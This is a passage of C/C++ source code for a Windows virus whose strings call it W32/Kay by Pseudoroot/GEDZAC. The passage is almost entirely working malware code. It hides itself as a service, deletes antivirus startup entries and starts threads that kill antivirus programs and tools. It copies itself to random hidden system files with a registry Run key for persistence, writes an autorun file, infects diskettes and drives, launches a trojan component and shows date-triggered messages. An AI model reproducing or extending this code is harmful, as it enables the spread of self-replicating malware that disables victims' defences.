   if (RegisterServiceProcess)
   {
   RegisterServiceProcess(0,1);
   FreeLibrary(hkernelLib);
   }
   }
   }

   //  //////////////////////////////
   void DelRegAvs()
   {
   HKEY k;
   char* temp0;
   const char* puntero;
      for (int j=0;j<9;j++)
   {
   puntero=EncDec(ArrAvs[j], "ValorName",1);
   RegCreateKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,0,0,KEY_ALL_ACCESS,0,&k,0);
   RegDeleteValue(k,puntero);
   RegCloseKey(k);
   }
   }

   // /////////////////////////////
   bool RegMut()
   {
   HKEY key;
   unsigned char buff[1024];
   DWORD dbuf=sizeof(buff);
   char st[1024];

   int i;
   LPSTR Tpath=new char[MAX_PATH];

   RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\PR\\GEDZAC",0,KEY_QUERY_VALUE,&key);
   RegQueryValueEx(key,"",0,NULL,buff,&dbuf);
   sprintf(st,"%s",buff);
   if(strstr(st,"Kay")==0)
   {
   RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\PR\\GEDZAC",&key);
   RegSetValueEx(key,"",0,REG_SZ,(LPBYTE)"Kay",3);
   }
   srand((unsigned int) GetTickCount());
   strcat(winfol,"\\");
   strcat(winfol,LetrasRnd(9));
   strcat(winfol,ExtRnd());
   //strcpy(nm,winfol);  // por si ocupara la ruta de winfol para otra
   CopyFile(mimodu,winfol,0);
   SetFileAttributes(winfol,FILE_ATTRIBUTE_HIDDEN + FILE_ATTRIBUTE_SYSTEM);
   RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\run",0,KEY_SET_VALUE,&key);
   RegSetValueEx(key,LetrasRnd(7),0,REG_SZ,(const unsigned char*)winfol,sizeof(winfol));
   RegCloseKey(key);
   }

   void Pay()
   {
       SYSTEMTIME t;
       GetSystemTime(&t);
       if(t.wDay==27)
       MessageBoxA(0,"Kay By Pseudoroot/GEDZAC","GEDZAC LABS",0);
       if(t.wDay==02 && t.wMonth==11)
        MessageBoxA(0,"Estas infectado?","Por W32/Kay",0);
   }

   int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance,
       LPSTR lpCmdLine, int nCmdShow )

   {

       Mut();
       srand((unsigned int) GetTickCount());
        GetModuleFileName(0,mimodu,256);
       GetSystemDirectory(carpsys,sizeof(carpsys));
       GetWindowsDirectory(winfol,sizeof(winfol));
   firstLt=FindDrive(winfol);
   strcpy(aleacopy,firstLt);
   strcat(aleacopy,":\\");
   strcat(aleacopy,LetrasRnd(7));
   strcat(aleacopy,".EXE");
   CopyFile(mimodu,aleacopy,0);
      RegMut();
      OS();
      if(Version==1)
      {
      oc();
      WriteIni();
      CreateThread(0,0,AvKill,0,0,&Id);
       }
       else{
          CargaApis();
        CreateThread(0,0,AvKillNT,0,0,&Id);
       }
     strcat(firstLt,":\\");
   writeauto();
        Sleep(400);
     FindFiles(firstLt);



   DelRegAvs();
     Pay();
   CreateThread(0,0,Infect_Diskette,0,0,&Id);
   CreateThread(0,0,th,0,0,&Id);      // mata window
   CreateThread(0,0,Troyan_Component,0,0,&Id);
   CreateThread(0,0,Infect_Disk,0,0,&Id);
   CreateThread(0,0,Mat4Tools,0,0,&Id);

      Sleep(INFINITE);

       return 0;


   }
